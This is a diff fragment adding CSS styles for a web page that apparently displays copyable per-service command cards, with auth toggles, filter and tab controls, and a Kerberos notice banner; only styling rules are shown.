+  .var input{background:var(--panel2);border:1px solid var(--line);border-radius:6px;
+    padding:.42rem .55rem;color:var(--ink);font-family:inherit;font-size:.74rem;outline:none;transition:border-color .12s}
+  .var input:focus{border-color:var(--amber)}
+  .var input::placeholder{color:#33414f}
+
+  .auth-row{display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;margin-top:.85rem;
+    padding-top:.8rem;border-top:1px solid var(--line)}
+  .auth-lbl{font-size:.56rem;text-transform:uppercase;letter-spacing:.12em;color:var(--dim)}
+  .auth-toggle{display:inline-flex;background:var(--panel2);border:1px solid var(--line);border-radius:7px;padding:2px}
+  .auth-btn{background:none;border:none;color:var(--dim);font-family:inherit;font-size:.68rem;
+    padding:.34rem .8rem;border-radius:5px;cursor:pointer;transition:all .12s}
+  .auth-btn:hover{color:var(--ink)}
+  .auth-btn.on{background:var(--amber);color:#1a1206;font-weight:700}
+  .derived{display:flex;gap:.4rem;flex-wrap:wrap;margin-left:auto}
+  .chip{display:flex;flex-direction:column;gap:1px;background:var(--panel2);border:1px solid var(--line);
+    border-radius:6px;padding:.3rem .55rem;cursor:pointer;transition:border-color .12s;max-width:260px}
+  .chip:hover{border-color:var(--accent)}
+  .chip-label{font-size:.5rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
+  .chip-val{font-size:.66rem;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+
+  .krb-banner{margin-top:.75rem;background:var(--amber-soft);border:1px solid #f5a62355;border-radius:7px;
+    padding:.5rem .7rem;font-size:.66rem;line-height:1.5;color:#f0c987}
+  .krb-banner code{background:#0006;padding:.04rem .3rem;border-radius:3px;color:#ffd98a}
+  .krb-banner b{color:#ffd98a}
+
+  .filter-wrap{max-width:1080px;margin:0 auto 1rem;display:flex;gap:.5rem;align-items:center}
+  .filter{flex:1;background:var(--panel);border:1px solid var(--line);border-radius:8px;
+    padding:.55rem .75rem;color:var(--ink);font-family:inherit;font-size:.74rem;outline:none;transition:border-color .12s}
+  .filter:focus{border-color:var(--amber)}
+  .filter::placeholder{color:#3a4856}
+  .filter-clear{background:none;border:1px solid var(--line);color:var(--dim);border-radius:6px;
+    padding:.5rem .7rem;font-family:inherit;font-size:.66rem;cursor:pointer}
+  .filter-clear:hover{color:var(--ink);border-color:var(--dim)}
+
+  .tabs{max-width:1080px;margin:0 auto .9rem;display:flex;gap:.3rem;flex-wrap:wrap}
+  .tab{background:var(--panel);border:1px solid var(--line);color:var(--dim);border-radius:6px;
+    padding:.34rem .7rem;font-family:inherit;font-size:.66rem;cursor:pointer;transition:all .12s}
+  .tab:hover{color:var(--ink);border-color:var(--dim)}
+  .tab.on{color:var(--amber);border-color:var(--amber);background:#1c150622}
+
+  .results{max-width:1080px;margin:0 auto;display:flex;flex-direction:column;gap:1.3rem}
+  .svc-block{display:flex;flex-direction:column;gap:.55rem}
+  .svc-name{font-family:'Space Grotesk',sans-serif;font-size:.78rem;font-weight:700;color:#9fb4c8;
+    text-transform:uppercase;letter-spacing:.12em;padding-bottom:.4rem;border-bottom:1px solid var(--line)}
+  .cmd-list{display:grid;grid-template-columns:1fr;gap:.5rem}
+
+  .cmd{background:var(--panel2);border:1px solid var(--line);border-radius:8px;overflow:hidden;
+    cursor:pointer;transition:border-color .12s,transform .08s}
+  .cmd:hover{border-color:#2b3a49}
+  .cmd:active{transform:translateY(1px)}
+  .cmd-head{display:flex;justify-content:space-between;align-items:center;
+    padding:.4rem .65rem;background:#0a0e13;border-bottom:1px solid var(--line)}
+  .cmd-label{font-size:.64rem;color:var(--accent);letter-spacing:.02em}
+  .cmd-copy{font-size:.56rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
+  .cmd-copy.ok{color:var(--ok)}
+  .cmd-text{padding:.6rem .65rem;font-size:.7rem;line-height:1.7;color:#aac4e0;
+    white-space:pre-wrap;word-break:break-all}
+  .cmd-text .tok{color:var(--amber);background:var(--amber-soft);border-radius:3px;padding:0 .15rem;font-weight:500}
+  .cmd-note{padding:.4rem .65rem;border-top:1px solid var(--line);font-size:.6rem;color:var(--dim);line-height:1.5}
+
+  .empty{text-align:center;padding:2.5rem;color:var(--dim);font-size:.74rem}
+
+  @media (max-width:560px){
+    .derived{margin-left:0;width:100%}
+    .cmd-text{word-break:break-all}
+  }
 `;
